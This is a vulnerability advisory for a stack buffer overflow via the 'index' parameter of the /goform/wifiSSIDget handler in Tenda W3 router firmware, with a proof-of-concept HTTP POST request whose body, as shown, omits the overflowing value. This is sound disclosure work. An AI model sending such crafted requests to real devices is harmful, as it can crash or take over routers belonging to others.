# Tenda w3 V1.0.0.4(3822)_EN formwrlSSIDget index Buffer Overflow

Vendor: Tenda

Product: w3 V1.0.0.4(3822)_EN

Vulnerability: Buffer Overflow

## Overview

Firmware download website: https://www.tenda.com.cn/material/show/2575

## Affected version

Tenda w3 V1.0.0.4(3822)_EN

## Vulnerability details

Tenda w3 V1.0.0.4(3822)_EN was discovered to contain a buffer overflow via the `index` parameter in the `formwrlSSIDget` function. The `index` input is copied into a stack-based buffer without validating its length. A long `index` value can overwrite adjacent stack data, resulting in a crash and potential code execution within the HTTP service.

This vulnerability lies in the `/goform/wifiSSIDget` page.

<div  align="center"><img src="./img/function.png" style="zoom:80%;" /></div>

## Proof of Concept (PoC)



```bash
POST /goform/wifiSSIDget HTTP/1.1
Host: 192.168.6.2
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.6.2/index.asp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 4169

wl_radio=0&

```
